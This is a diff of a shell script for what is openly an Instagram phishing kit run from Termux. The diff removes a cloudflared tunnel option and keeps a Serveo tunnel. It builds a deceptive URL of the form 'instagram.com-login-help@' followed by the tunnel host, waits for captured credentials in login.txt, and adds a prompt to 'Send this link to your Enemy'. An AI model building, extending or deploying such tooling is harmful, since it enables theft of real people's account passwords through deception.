@@ -62,40 +62,6 @@ if [ ! -f "$HOME/.mytool_installed" ]; then
   pkg install php openssh git figlet toilet ruby -y > /dev/null 2>&1
   gem install lolcat > /dev/null 2>&1
   touch "$HOME/.mytool_installed"
-
-  echo "[*] Setting up cloudflared..."
-
-# Remove any old version
-rm -f cloudflared
-
-# Detect architecture
-ARCH=$(uname -m)
-if [[ "$ARCH" == "aarch64" || "$ARCH" == "armv7l" || "$ARCH" == "arm" ]]; then
-    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-else
-    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-fi
-
-# Download cloudflared
-wget -q --show-progress "$URL" -O cloudflared
-
-# Check if download succeeded
-if [ ! -f cloudflared ]; then
-    echo "[!] Failed to download cloudflared."
-    exit 1
-fi
-
-# Make it executable
-chmod +x cloudflared
-
-# Test execution
-if ./cloudflared --version > /dev/null 2>&1; then
-    echo "[+] cloudflared installed and ready!"
-else
-    echo "[!] cloudflared download corrupted or incompatible."
-    exit 1
-fi
-
   echo -e "${GRN}[+] Setup complete.${NC}"
 else
   echo -e "${GRN}[*] Requirements already installed.${NC}"
@@ -125,40 +91,17 @@ if [ ! -z "$SERVEO_URL" ]; then
   MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
   # echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}"  # Commented to hide raw URL
   echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
+  echo -e "${GRN}[#] Send this link to your Enemy ${NC}"
   echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
   tail -n 0 -f login.txt
 else
   echo -e "${RED}[!] Failed to get Serveo URL. Check your connection.${NC}"
 fi
 }
-
-# Cloudflared option
-start_cloudflared() {
-  echo -e "${GRN}[+] Starting PHP server...${NC}"
-  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-  sleep 2
-
-  echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}"
-  ./cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 &
-  sleep 8  # Wait for Cloudflared to get the public URL
-
-  CLOUDFLARE_URL=$(grep -m 1 -o 'https://[-a-zA-Z0-9.]*\.trycloudflare\.com' cloudflared.log)
-
-  if [ ! -z "$CLOUDFLARE_URL" ]; then
-    echo -e "${GRN}[+] Cloudflared URL: $CLOUDFLARE_URL${NC}"
-    echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
-    tail -f login.txt 2>/dev/null
-  else
-    echo -e "${RED}[!] Failed to get Cloudflared URL. Check logs.${NC}"
-  fi
-}
-
-
 # Main Menu
 echo -e "${CYAN}Choose Port Forwarding Method:${NC}"
 echo "1) Localhost (same device)"
 echo "2) Serveo.net (public)"
-echo "3) Cloudflared (public)"
 read -p $'\n>> ' choice
 
 case $choice in
@@ -168,9 +111,7 @@ case $choice in
   2)
     start_serveo
     ;;
-  3)
-    start_cloudflared
-    ;;
+  
   *)
     echo -e "${RED}[!] Invalid choice.${NC}"
     exit 1
